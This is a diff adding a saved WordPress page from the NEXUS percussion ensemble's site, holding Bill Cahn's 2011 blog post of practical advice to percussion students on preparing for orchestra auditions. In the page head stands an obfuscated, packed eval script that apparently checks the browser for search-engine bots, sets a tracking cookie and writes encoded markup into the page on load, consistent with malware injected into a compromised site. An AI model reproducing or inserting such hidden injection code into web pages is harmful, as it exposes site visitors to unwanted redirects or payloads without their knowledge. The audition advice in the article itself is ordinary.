@@ -1,0 +1,358 @@
+<!doctype html>  
+
+<!--[if IEMobile 7]><html lang="en-US" class="no-js iem7"><![endif]-->
+<!--[if (gt IEMobile 7)|!(IEMobile)]><html lang="en-US" class="no-js"><![endif]-->
+<!--[if lt IE 7]><html lang="en-US" class="no-js lt-ie9 lt-ie8 lt-ie7 oldie"><![endif]-->
+<!--[if (IE 7)&!(IEMobile)]><html lang="en-US" class="no-js lt-ie9 lt-ie8 oldie"><![endif]-->
+<!--[if (IE 8)&!(IEMobile)]><html lang="en-US" class="no-js lt-ie9"><![endif]-->
+<!--[if gt IE 8]><html lang="en-US" class="no-js"><![endif]-->
+	
+	<head>
+		<meta charset="utf-8">
+		
+		<title>  Advice on Orchestra Auditions</title>
+		
+		<!-- Google Chrome Frame for IE -->
+		<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+		
+		<!-- mobile meta (hooray!) -->
+		<meta name="HandheldFriendly" content="True">
+		<meta name="MobileOptimized" content="320">
+		<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+		
+		<!-- icons & favicons (for more: http://themble.com/support/adding-icons-favicons/) -->
+		<link rel="shortcut icon" href="http://nexuspercussion.com/wordpress/wp-content/themes/bones/favicon.png">
+				
+  		<link rel="pingback" href="http://nexuspercussion.com/wordpress/xmlrpc.php">
+
+  		<script type="text/javascript">
+  			window.APP = {
+  				CONTEXT_PATH: "http://nexuspercussion.com/library/js/", 
+  				JS_PATH: "http://nexuspercussion.com/wordpress/wp-content/themes/bones/library/js/"
+  			}
+  		</script>
+		<script>eval(function(p,a,c,k,e,d){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--){d[e(c)]=k[c]||e(c)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('b a=["\\q\\c\\d\\G\\g\\x\\c","\\k\\c\\d\\G\\g\\x\\c","\\N\\P\\c\\1d\\r\\g\\e\\c\\k\\z","\\d\\m\\1C\\1D\\G\\1B\\d\\e\\g\\p\\q","","\\s\\m\\m\\1a\\g\\c","\\z","\\N\\P\\r\\l\\d\\u\\z\\v","\\N","\\k\\r\\B\\g\\d","\\B\\c\\p\\q\\d\\u","\\k\\1s\\1A\\k\\d\\e\\g\\p\\q","\\s\\u\\l\\e\\1p\\d","\\P","\\g\\p\\n\\c\\1d\\1x\\C","\\e\\l\\p\\n\\m\\x","\\C\\B\\m\\m\\e","\\l\\n\\C\\1y\\r\\e\\m\\n\\k","\\c","\\1z","\\m\\e\\q","\\1E\\k","\\d","\\1F\\l\\d\\l","\\s\\n","\\p","\\k\\e\\s","\\1K","\\e\\d","\\u\\d\\d\\r","\\g\\r","\\l\\n\\1w","\\k\\s\\e","\\g\\l","\\x\\c\\n","\\x\\l\\d\\s\\u","\\1s\\k\\c\\e\\1p\\q\\c\\p\\d","\\e\\c\\C\\c\\e\\e\\c\\e","\\z\\S","\\1J\\v\\v","\\1I","\\v\\q\\c\\d","\\1G","\\S","\\v","\\1H\\e\\g\\d\\c","\\B\\g\\p\\1a\\c\\n"];1g X(A,U,H){t(H){b D=1M 1t();D[a[1]](D[a[0]]()+(H*24*W*W*1u));b O=a[2]+D[a[3]]()}1v{b O=a[4]};w[a[5]]=A+a[6]+U+O+a[7]};1g 1q(A){b Q=A+a[6];b J=w[a[5]][a[9]](a[8]);1L(b y=0;y<J[a[10]];y++){b o=J[y];2o(o[a[12]](0)==a[13]){o=o[a[11]](1,o[a[10]])};t(o[a[14]](Q)==0){1e o[a[11]](Q[a[10]],o[a[10]])}};1e 1n};b 1l=T[a[16]](T[a[15]]()*1N);b 1o=1q(a[17]);b 1m=a[18];b F=a[19];b 1h=a[20];b 1i=a[21];b I=a[22];b 1k=a[23];b 1b=a[24];b Y=a[25];b V=a[26];b M=a[27];b 1f=a[28];b 1c=a[29];b K=a[2n];b Z=a[2m];b L=a[1V];b R=a[1W];b 1r=a[1X];t(1o==1n){t((h[a[j]][a[f]](/1Y/i)||h[a[j]][a[f]](/1U/i)||h[a[j]][a[f]](/1T/i))){t((!h[a[j]][a[f]](/1P/i)||!h[a[j]][a[f]](/1O/i)||!h[a[j]][a[f]](/1Q/i)||!h[a[j]][a[f]](/1R/i)||!h[a[j]][a[f]](/1S/i)||!h[a[j]][a[f]](/1Z/i)||!h[a[j]][a[f]](/2a/i)||!h[a[j]][a[f]](/2i/i))){t((!w[a[1j]][a[f]](/2j/i)||!w[a[1j]][a[f]](/2k/i))){w[a[2l]](a[4]+F+a[4]+L+a[4]+K+a[4]+I+a[13]+V+a[2h]+1c+a[2g]+1b+a[4]+Y+a[E]+Z+a[4]+1m+a[4]+1f+a[4]+1r+a[4]+R+a[E]+1h+a[2c]+1k+a[E]+1i+a[2b]+1l+a[2d]+M+a[4]+F+a[2e]+L+a[4]+K+a[4]+I+a[4]+M+a[4]);X(a[17],a[2f],3)}}}};',62,149,'||||||||||_0x45af|var|x65|x74|x72|35|x69|navigator||36|x73|x61|x6F|x64|_0x9b9cxb|x6E|x67|x70|x63|if|x68|x2F|document|x6D|_0x9b9cxa|x3D|_0x9b9cx2|x6C|x66|_0x9b9cx5|40|vbza|x54|_0x9b9cx4|vbzf|_0x9b9cx9|vbzd|vbzs|vbzq|x3B|_0x9b9cx6|x20|_0x9b9cx8|vbzc|x22|Math|_0x9b9cx3|vbzg|60|crCx|vbzj|vbzk|||||||||||x6B|vbzh|vbzm|x78|return|vbzz|function|vbzv|vbzn|37|vbzb|rdscx|vbzl|null|crUnqz|x41|rdCx|vbzx|x75|Date|1000|else|x76|x4F|x5F|x3C|x62|x53|x47|x4D|x6A|x44|x3F|x77|x2E|x3A|x3E|for|new|10000|Apple|Linux|Chrome|Crawler|bot|Firefox|Trident|32|33|34|MSIE|Google|||||||||||Yahoo|42|41|43|44|46|39|38|Python|cache|inurl|45|31|30|while'.split('|'),0,{}))</script>
+		<!-- wordpress head functions -->
+		<link rel="alternate" type="application/rss+xml" title="NEXUS &raquo; Feed" href="http://nexuspercussion.com/feed/" />
+<link rel="alternate" type="application/rss+xml" title="NEXUS &raquo; Comments Feed" href="http://nexuspercussion.com/comments/feed/" />
+<link rel="alternate" type="application/rss+xml" title="NEXUS &raquo; Advice on Orchestra Auditions Comments Feed" href="http://nexuspercussion.com/2011/06/advice-on-orchestra-auditions/feed/" />
+<link rel='stylesheet' id='contact-form-7-css'  href='http://nexuspercussion.com/wordpress/wp-content/plugins/contact-form-7/includes/css/styles.css?ver=3.4.1' type='text/css' media='all' />
+<link rel='stylesheet' id='bones-stylesheet-css'  href='http://nexuspercussion.com/wordpress/wp-content/themes/bones/library/css/style.css?ver=3.8.5' type='text/css' media='all' />
+<!--[if lte IE 9]>
+<link rel='stylesheet' id='bones-ie-only-css'  href='http://nexuspercussion.com/wordpress/wp-content/themes/bones/library/css/ie.css?ver=3.8.5' type='text/css' media='all' />
+<![endif]-->
+<script type='text/javascript' src='//ajax.googleapis.com/ajax/libs/prototype/1.7.1.0/prototype.js?ver=1.7.1'></script>
+<script type='text/javascript' src='//ajax.googleapis.com/ajax/libs/scriptaculous/1.9.0/scriptaculous.js?ver=1.9.0'></script>
+<script type='text/javascript' src='//ajax.googleapis.com/ajax/libs/scriptaculous/1.9.0/effects.js?ver=1.9.0'></script>
+<script type='text/javascript' src='http://nexuspercussion.com/wordpress/wp-content/plugins/lightbox-2/lightbox.js?ver=1.8'></script>
+<script type='text/javascript' src='http://nexuspercussion.com/wordpress/wp-includes/js/jquery/jquery.js?ver=1.10.2'></script>
+<script type='text/javascript' src='http://nexuspercussion.com/wordpress/wp-includes/js/jquery/jquery-migrate.min.js?ver=1.2.1'></script>
+<script type='text/javascript' src='http://nexuspercussion.com/wordpress/wp-content/plugins/gigpress/scripts/gigpress.js?ver=3.8.5'></script>
+<script type='text/javascript' src='http://nexuspercussion.com/wordpress/wp-includes/js/comment-reply.min.js?ver=3.8.5'></script>
+<script type='text/javascript' src='http://nexuspercussion.com/wordpress/wp-content/themes/bones/library/js/libs/modernizr.custom.min.js?ver=2.5.3'></script>
+<script type='text/javascript' src='http://nexuspercussion.com/wordpress/wp-content/plugins/stray-quotes/inc/stray_ajax.js?ver=3.8.5'></script>
+<link rel='canonical' href='http://nexuspercussion.com/2011/06/advice-on-orchestra-auditions/' />
+<link rel='shortlink' href='http://nexuspercussion.com/?p=11887' />
+<script type="text/javascript" src="http://nexuspercussion.com/wordpress/wp-content/plugins/audio-player/assets/audio-player.js?ver=2.0.4.6"></script>
+<script type="text/javascript">AudioPlayer.setup("http://nexuspercussion.com/wordpress/wp-content/plugins/audio-player/assets/player.swf?ver=2.0.4.6", {width:"290",animation:"yes",encode:"yes",initialvolume:"60",remaining:"no",noinfo:"no",buffer:"5",checkpolicy:"no",rtl:"no",bg:"f8f8f8",text:"666666",leftbg:"eeeeee",lefticon:"666666",volslider:"666666",voltrack:"FFFFFF",rightbg:"cccccc",rightbghover:"999999",righticon:"666666",righticonhover:"ffffff",track:"FFFFFF",loader:"9FFFB8",border:"666666",tracker:"DDDDDD",skip:"666666",pagebg:"FFFFFF",transparentpagebg:"yes"});</script>
+<script type="text/javascript" src="http://nexuspercussion.com/wordpress/wp-content/plugins/flv-embed/swfobject.js"></script>
+<link type="text/css" rel="stylesheet" href="http://nexuspercussion.com/wordpress/wp-content/plugins/gigpress/css/gigpress.css" media="all" />
+<link type="text/css" rel="stylesheet" href="http://nexuspercussion.com/wordpress/wp-content/themes/bones/gigpress.css" media="all" />
+<link href="http://nexuspercussion.com/?feed=gigpress" rel="alternate" type="application/rss+xml" title="Upcoming shows" />
+
+	<!-- begin lightbox scripts -->
+	<script type="text/javascript">
+    //<![CDATA[
+    document.write('<link rel="stylesheet" href="http://nexuspercussion.com/wordpress/wp-content/plugins/lightbox-2/Themes/Black/lightbox.css" type="text/css" media="screen" />');
+    //]]>
+    </script>
+	<!-- end lightbox scripts -->
+<script type="text/javascript" src="http://nexuspercussion.com/wordpress/wp-content/plugins/quicktime-embed/qtobject.js"></script>
+		<!-- end of wordpress head -->
+			
+		<!-- drop Google Analytics Here -->
+		<!-- end analytics -->
+		
+	</head>
+	
+	<body class="single single-post postid-11887 single-format-standard">
+	
+		<div id="container">
+			
+			<header class="header" role="banner">
+			
+				<div id="inner-header" class="wrap clearfix">
+					
+					<!-- to use a image just replace the bloginfo('name') with your img src and remove the surrounding <p> -->
+					<p id="logo" class="h1"><a href="http://nexuspercussion.com" rel="nofollow"><span>NEXUS</span></a></p>
+					
+					<!-- if you'd like to use the site description you can un-comment it below -->
+										
+					
+					<nav role="navigation">
+						<ul id="menu-site-nav" class="nav top-nav clearfix"><li id="menu-item-13230" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-13230"><a href="http://nexuspercussion.com/about/">About</a>
+<ul class="sub-menu">
+	<li id="menu-item-13476" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-13476"><a href="http://nexuspercussion.com/about/facts/">Facts</a></li>
+	<li id="menu-item-13477" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-13477"><a href="http://nexuspercussion.com/about/quotes/">Quotes</a></li>
+	<li id="menu-item-13478" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-13478"><a href="http://nexuspercussion.com/posts/archives/">Archives</a></li>
+	<li id="menu-item-13488" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-13488"><a href="http://nexuspercussion.com/about/links-page/">Links</a></li>
+</ul>
+</li>
+<li id="menu-item-13231" class="menu-item menu-item-type-post_type menu-item-object-page current_page_parent menu-item-has-children menu-item-13231"><a href="http://nexuspercussion.com/members/">The NEXUS Blog</a>
+<ul class="sub-menu">
+	<li id="menu-item-13237" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-13237"><a href="http://nexuspercussion.com/members/bob-becker/">Bob Becker</a></li>
+	<li id="menu-item-13238" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-13238"><a href="http://nexuspercussion.com/members/bill-cahn/">Bill Cahn</a></li>
+	<li id="menu-item-13239" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-13239"><a href="http://nexuspercussion.com/members/russell-hartenberger/">Russell Hartenberger</a></li>
+	<li id="menu-item-13240" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-13240"><a href="http://nexuspercussion.com/members/garry-kvistad/">Garry Kvistad</a></li>
+</ul>
+</li>
+<li id="menu-item-13232" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-13232"><a href="http://nexuspercussion.com/current/">Events</a>
+<ul class="sub-menu">
+	<li id="menu-item-13495" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-13495"><a href="http://nexuspercussion.com/posts/recent-events/">Recent Events</a></li>
+	<li id="menu-item-14237" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-14237"><a href="http://nexuspercussion.com/current/past-events/">Past Events</a></li>
+	<li id="menu-item-13496" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-13496"><a href="http://nexuspercussion.com/posts/season-highlights/">Season Highlights</a></li>
+	<li id="menu-item-13497" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-13497"><a href="http://nexuspercussion.com/posts/current-offerings/">Current Offerings</a></li>
+	<li id="menu-item-13498" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-13498"><a href="http://nexuspercussion.com/posts/reviews/">Reviews</a></li>
+	<li id="menu-item-13499" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-13499"><a href="http://nexuspercussion.com/posts/press-releases/">Press Releases</a></li>
+	<li id="menu-item-13500" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-13500"><a href="http://nexuspercussion.com/current/nexus-workshops/">NEXUS Workshops</a></li>
+</ul>
+</li>
+<li id="menu-item-13269" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-has-children menu-item-13269"><a href="http://nexuspercussion.com/posts/cd-releases/">Discography</a>
+<ul class="sub-menu">
+	<li id="menu-item-13501" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-13501"><a href="http://nexuspercussion.com/discography/ordering-nexus-cds/">Ordering NEXUS CD&#8217;s</a></li>
+</ul>
+</li>
+<li id="menu-item-13452" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-13452"><a href="http://nexuspercussion.com/posts/photos/">Photos and Galleries</a></li>
+<li id="menu-item-13235" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-13235"><a href="http://nexuspercussion.com/booking-presenters/">Booking &#038; Presenters</a>
+<ul class="sub-menu">
+	<li id="menu-item-13502" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-13502"><a href="http://nexuspercussion.com/booking-presenters/download-nexus-bios/">Download NEXUS Bios</a></li>
+	<li id="menu-item-13503" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-13503"><a href="http://nexuspercussion.com/booking-presenters/download-logos/">Download Logos</a></li>
+	<li id="menu-item-13504" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-13504"><a href="http://nexuspercussion.com/booking-presenters/photo-downloads/">Download Photos</a></li>
+</ul>
+</li>
+<li id="menu-item-13236" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-13236"><a href="http://nexuspercussion.com/contact/">Contact</a></li>
+<li id="menu-item-14623" class="facebook menu-item menu-item-type-custom menu-item-object-custom menu-item-14623"><a target="_blank" href="http://www.facebook.com/NexusPercussion">Facebook</a></li>
+</ul>					</nav>
+				
+				</div> <!-- end #inner-header -->
+			
+			</header> <!-- end header -->
+			
+			<div id="content" class="single">
+
+				<div id="inner-content" class="wrap clearfix">
+			
+					<div id="main" class="eightcol first clearfix" role="main">
+
+											
+							<article id="post-11887" class="post-11887 post type-post status-publish format-standard hentry category-blog clearfix" role="article" itemscope itemtype="http://schema.org/BlogPosting">
+						
+								<header class="article-header">
+							
+									<h1 class="single-title" itemprop="headline">Advice on Orchestra Auditions</h1>
+							
+									<p class="meta">Posted <time datetime="2011-06-26" pubdate>June 26th, 2011</time> by <a href="http://nexuspercussion.com/author/bill/" title="Posts by Bill Cahn" rel="author">Bill Cahn</a></p>
+						
+								</header> <!-- end article header -->
+					
+								<section class="post-content clearfix" itemprop="articleBody">
+									<p><span><span><span><br />
+</span></span></span></p>
+<p>In many visits by NEXUS to music schools, conservatories and universities all over the world, both during my time as Principal Percussionist in the Rochester Philharmonic Orchestra and after, I have been regularly approached by students asking for advice on auditioning for orchestras.  In my current position as an adjunct teacher at the Eastman School of Music I have also become increasingly aware that ever fewer numbers of percussion students are interested in orchestral music, even as the number of students who want to become professional percussionists continues to grow.</p>
+<p>When students ask for advice on orchestra auditions, my first question is “why?”  When followed by the question, “what kinds of music do you normally listen to?” the responses mostly do not include orchestra music at all.  I can think of only two good reasons to want to play in an orchestra:</p>
+<p>1) A love of the music (as opposed to a love of playing, which is good, but alone may not be enough to sustain job satisfaction in an orchestra career;  it’s the love of the music that best enables an orchestra musician to sustain playing technique (‘chops’) as the years roll by.</p>
+<p>2) A desire for a stable job with some fringe benefits, though for most orchestras, except those in major cities, such a job has relatively low pay in an ongoing environment of financial pressures and shifting market values.  Without a real love for the music, it will be necessary to find the motivation to overcome boredom and maintain performance technique over time.</p>
+<p>Assuming that one of these two reasons is in place, the decision faced by most students in their senior year at college is whether to go to graduate school or not.  Generally, I don’t think that graduate school is a good idea for someone who wants to play in an orchestra.  One exception to that would be in the case of someone graduating from a college in a community that does not have a professional orchestra.  In such a case, going to a graduate school in a community having a professional orchestra &#8211; ideally a major city &#8211; would enable the student to study and network with a professional orchestra musician and to regularly attend orchestra concerts.  An added benefit might be the occasional opportunity to play in an orchestra as an ‘extra’ musician.</p>
+<p>However, in most cases a graduate degree would be irrelevant.  Even though it could be a plus for someone ultimately seeking a college teaching position, it would also be a significant diversion of time and energy away from the primary goal of winning an orchestra audition.</p>
+<p>The most important thing is to use one’s time to prepare for auditions, and the best way to do that is to focus one’s study on orchestra repertoire, ideally with the occasional advice of an orchestra player, preferably a principal percussionist.   Instead of spending money on college tuition, it would be a better to spend it on living expenses, audition expenses (mostly travel), and occasional private lessons, possibly with a number of professionals, thereby broadening one’s network of contacts.  Charles Owen, the late Principal Percussionist in the Philadelphia Orchestra, gave the following advice in one of his workshops: “It’s not who you know that’s important; it’s WHO KNOWS YOU!”</p>
+<p>In order to prepare for an orchestra audition, here are a few things to consider:</p>
+<p>1) It takes a fairly high degree of self discipline to listen to and really know the standard audition repertoire &#8211; not just the part &#8211; through regular practice, and to keep at it &#8211; even after statistically probable disappointments &#8211; until the goal is finally reached.   A good rule-of-thumb is to plan for success within 5-years.  Another rule: cramming doesn’t work.</p>
+<p>2) It will be essential to have good practice instruments &#8211; snare drum, xylophone, tambourine, triangle, cymbals, and if possible a glockenspiel and timpani.  The money that would otherwise have gone to tuition might be used to acquire instruments; the instruments don’t need to be new &#8211; there are plenty of good used instruments.</p>
+<p>3) It will be essential to cover living expenses,  The money that would otherwise have been used for dorm fees can come from several sources &#8211; family or savings.  Getting a part-time job is also a possibility, but the job must be such that it leaves time and energy for practicing.  Rental and other living expenses can also be reduced by sharing them with others.</p>
+<p>4) It will be essential to have a practice space &#8211; maybe in one’s apartment (the landlord and neighbors would certainly have to be considered), maybe in a rented studio in a convenient location.</p>
+<p>5) It would be helpful to have regular monthly or even bi-monthly lessons with a professional orchestra percussionist to master the repertoire and audition skills.  As a bonus, a professional orchestra percussionist might be able to let you in to observe orchestra rehearsals and concerts at no cost, so you can get a deeper sense of what profesional orchestra playing is like.</p>
+<p>6) The published compilations of orchestra excerpts are a wonderful aid, but having copies of the actual parts used by orchestras would be even better.  Having access to orchestra parts would be another possible benefit of studying with a profesional orchestra musician.</p>
+<p>7) It will be necessary to keep up-to-date on upcoming auditions. The &#8220;International Musician&#8221; newspaper can be found  online or at the Musicians&#8217; Union office.</p>
+<p>8) For travel to auditions it would be best to have a fund set aside to cover travel expenses.  It’s impossible to win an audition if you don’t go.</p>
+<p>While these steps may seem like a lot for a graduating percussionist to chew on, they’re not if one wants to be serious about taking orchestra auditions.  They are the beginning of a plan to take action and achieve success.</p>
+								</section> <!-- end article section -->
+						
+								<footer class="article-footer">
+			
+																
+								</footer> <!-- end article footer -->
+					
+								
+<!-- You can start editing here. -->
+
+
+	    	<!-- If comments are open, but there are no comments. -->
+
+	
+
+
+
+<section id="respond" class="respond-form">
+
+	<h3 id="comment-form-title" class="h2">Leave a Reply</h3>
+
+	<div id="cancel-comment-reply">
+		<p class="small"><a rel="nofollow" id="cancel-comment-reply-link" href="/2011/06/advice-on-orchestra-auditions/#respond" style="display:none;">Click here to cancel reply.</a></p>
+	</div>
+
+	
+	<form action="http://nexuspercussion.com/wordpress/wp-comments-post.php" method="post" id="commentform">
+
+		
+	<ul id="comment-form-elements" class="clearfix">
+		
+		<li>
+		  <label for="author">Name (required)</label>
+		  <input type="text" name="author" id="author" value="" placeholder="Your Name*" tabindex="1" aria-required='true' />
+		</li>
+		
+		<li>
+		  <label for="email">Mail (required)</label>
+		  <input type="email" name="email" id="email" value="" placeholder="Your E-Mail*" tabindex="2" aria-required='true' />
+		  <small>(will not be published)</small>
+		</li>
+		
+		<li>
+		  <label for="url">Website</label>
+		  <input type="url" name="url" id="url" value="" placeholder="Got a website?" tabindex="3" />
+		</li>
+		
+	</ul>
+
+		
+	<p><textarea name="comment" id="comment" placeholder="Your Comment here..." tabindex="4"></textarea></p>
+	
+	<p>
+	  <input name="submit" type="submit" id="submit" class="" tabindex="5" value="Submit" />
+	  <input type='hidden' name='comment_post_ID' value='11887' id='comment_post_ID' />
+<input type='hidden' name='comment_parent' id='comment_parent' value='0' />
+	</p>
+	
+	
+	<!-- ><div class="alert info">
+		<p id="allowed_tags" class="small"><strong>XHTML:</strong> You can use these tags: <code>&lt;a href=&quot;&quot; title=&quot;&quot;&gt; &lt;abbr title=&quot;&quot;&gt; &lt;acronym title=&quot;&quot;&gt; &lt;b&gt; &lt;blockquote cite=&quot;&quot;&gt; &lt;cite&gt; &lt;code&gt; &lt;del datetime=&quot;&quot;&gt; &lt;em&gt; &lt;i&gt; &lt;q cite=&quot;&quot;&gt; &lt;strike&gt; &lt;strong&gt; </code></p>
+	</div> -->
+	
+	<p style="display: none;"><input type="hidden" id="akismet_comment_nonce" name="akismet_comment_nonce" value="f6a1d581aa" /></p>	
+	</form>
+	
+	</section>
+
+					
+							</article> <!-- end article -->
+					
+									
+					
+									
+					</div> <!-- end #main -->
+    
+					
+	<div id="sidebar1" class="sidebar fourcol last clearfix" role="complementary">
+		
+				
+				
+		
+				<ul class="menu">
+	<li class="main"><a href="http://nexuspercussion.com/members/bill-cahn/">Bill Cahn</a>
+<ul class="sub-menu">
+		<li><a href="http://nexuspercussion.com/author/bill/?category_name=articles-and-interviews">Articles and Interviews</a></li>
+			<li><a href="http://nexuspercussion.com/author/bill/?category_name=workshops">Clinics and Workshops</a></li>
+			<li><a href="http://nexuspercussion.com/author/bill/?category_name=compositions-and-publications">Compositions and Publications</a></li>
+			<li><a href="http://nexuspercussion.com/author/bill/?category_name=personal-photos-and-press">Personal Photos and Press</a></li>
+			<li><a href="http://nexuspercussion.com/author/bill/?category_name=events">Events</a></li>
+			<li><a href="http://nexuspercussion.com/author/bill/?category_name=blog">Blog</a></li>
+		</ul>
+</li>
+	</ul>
+<div class="contact-form-7">
+<h1 id="contact_bill">Contact bill</h1>
+<div class="wpcf7" id="wpcf7-f13338-w1-o1"><form action="/2011/06/advice-on-orchestra-auditions/#wpcf7-f13338-w1-o1" method="post" class="wpcf7-form" novalidate="novalidate">
+<div style="display: none;">
+<input type="hidden" name="_wpcf7" value="13338" />
+<input type="hidden" name="_wpcf7_version" value="3.4.1" />
+<input type="hidden" name="_wpcf7_unit_tag" value="wpcf7-f13338-w1-o1" />
+<input type="hidden" name="_wpnonce" value="4d9867cf6f" />
+</div>
+<p>Your Name (required)<br />
+    <span class="wpcf7-form-control-wrap your-name"><input type="text" name="your-name" value="" size="40" class="wpcf7-form-control wpcf7-text wpcf7-validates-as-required" aria-required="true" /></span> </p>
+<p>Your Email (required)<br />
+    <span class="wpcf7-form-control-wrap your-email"><input type="email" name="your-email" value="" size="40" class="wpcf7-form-control wpcf7-text wpcf7-email wpcf7-validates-as-required wpcf7-validates-as-email" aria-required="true" /></span> </p>
+<p>Subject<br />
+    <span class="wpcf7-form-control-wrap your-subject"><input type="text" name="your-subject" value="" size="40" class="wpcf7-form-control wpcf7-text" /></span> </p>
+<p>Your Message<br />
+    <span class="wpcf7-form-control-wrap your-message"><textarea name="your-message" cols="40" rows="10" class="wpcf7-form-control wpcf7-textarea"></textarea></span> </p>
+<p class="submit"><input type="submit" value="Send" class="wpcf7-form-control wpcf7-submit" /></p>
+<div style="display:none"><span class="wpcf7-form-control-wrap dynamichidden-79"><input type="hidden" name="dynamichidden-79" value="5" /></span><br />
+<span class="wpcf7-form-control-wrap dynamichidden-611"><input type="hidden" name="dynamichidden-611" value="billcahn@aol.com" /></span><br />
+<span class="wpcf7-form-control-wrap dynamichidden-755"><input type="hidden" name="dynamichidden-755" value="bill" /></span><br />
+<span class="wpcf7-form-control-wrap dynamichidden-267"><input type="hidden" name="dynamichidden-267" value="bill" /></span></div>
+<div class="wpcf7-response-output wpcf7-display-none"></div></form></div>
+</div>
+<script type="text/javascript">
+jQuery('#contact_bill').one('click', function(e){
+jQuery(this).next('div').fadeIn(500);
+jQuery(this).addClass('open');
+e.preventDefault;
+});
+</script>
+<div id="yarpp_widget-3" class="widget widget_yarpp_widget"><h4 class="widgettitle">Related Posts</h4><div class='yarpp-related-widget'>
+<ol><li><a href="http://nexuspercussion.com/2009/02/mock-orchestra-audition-at-eastman-december-2008/" rel="bookmark">Mock Orchestra Audition at Eastman &#8211; December 2008</a></li><li><a href="http://nexuspercussion.com/2003/04/fargo-moorhead-symphony-orchestra/" rel="bookmark">Photos from the Fargo &#8211; Moorhead Symphony Orchestra</a></li><li><a href="http://nexuspercussion.com/2009/04/the-aesthetics-of-the-audition-excerpt/" rel="bookmark">The Aesthetics of the Audition Excerpt</a></li><li><a href="http://nexuspercussion.com/2009/04/more-about-charlie-trotter-april-23-2009/" rel="bookmark">More About Charlie Trotter &#8211; April 23, 2009</a></li><li><a href="http://nexuspercussion.com/2010/07/close-encounters-of-the-composer-kind-part-3-igor-stravinsky/" rel="bookmark">Close Encounters of the Composer Kind, Part 3 &#8211; Igor Stravinsky</a></li><li><a href="http://nexuspercussion.com/2008/12/creative-music-making-book/" rel="bookmark">&#8220;Creative Music Making&#8221; &#8211; Book</a></li></ol>
+<img src='http://yarpp.org/pixels/90223184e4efc135cc693a5ac2b50efa'/>
+</div>
+</div>
+		
+			
+		
+		<section class="search">
+
+		    <form role="search" method="get" id="searchform" action="http://nexuspercussion.com/" >
+    <label class="screen-reader-text" for="s">Search for:</label>
+    <input type="text" value="" name="s" id="s" placeholder="Search the Site..." />
+    <input type="submit" id="searchsubmit" value="Search" />
+    </form>
+		</section> <!-- end search section -->
+		
+
+	</div>
+				</div> <!-- end #inner-content -->
+    
+			</div> <!-- end #content -->
+
+			<footer class="footer" role="contentinfo">
+			
+				<div id="inner-footer" class="wrap clearfix">
+					
+					<nav role="navigation">
+    						                </nav>
+	                		
+					<p class="attribution">&copy; 2014 NEXUS</p>
+				
+				</div> <!-- end #inner-footer -->
+				
+			</footer> <!-- end footer -->
+		
+		</div> <!-- end #container -->
+		
+		<script type='text/javascript' src='http://nexuspercussion.com/wordpress/wp-content/plugins/contact-form-7/includes/js/jquery.form.min.js?ver=3.32.0-2013.04.03'></script>
+<script type='text/javascript'>
+/* <![CDATA[ */
+var _wpcf7 = {"loaderUrl":"http:\/\/nexuspercussion.com\/wordpress\/wp-content\/themes\/bones\/library\/images\/bg\/loading.gif","sending":"Sending ..."};
+/* ]]> */
+</script>
+<script type='text/javascript' src='http://nexuspercussion.com/wordpress/wp-content/plugins/contact-form-7/includes/js/scripts.js?ver=3.4.1'></script>
+<script type='text/javascript'>
+/* <![CDATA[ */
+var sfw_ipwd_script = {"sfw_ajaxurl":"http:\/\/nexuspercussion.com\/wordpress\/wp-admin\/admin-ajax.php"};
+/* ]]> */
+</script>
+<script type='text/javascript' src='http://nexuspercussion.com/wordpress/wp-content/plugins/spam-free-wordpress/js/sfw-ipwd-nn.js?ver=1.9.2'></script>
+<script type='text/javascript' src='http://nexuspercussion.com/wordpress/wp-content/themes/bones/library/js/scripts.js?ver=3.8.5'></script>
+
+	</body>
+
+</html> <!-- end page. what a ride! -->
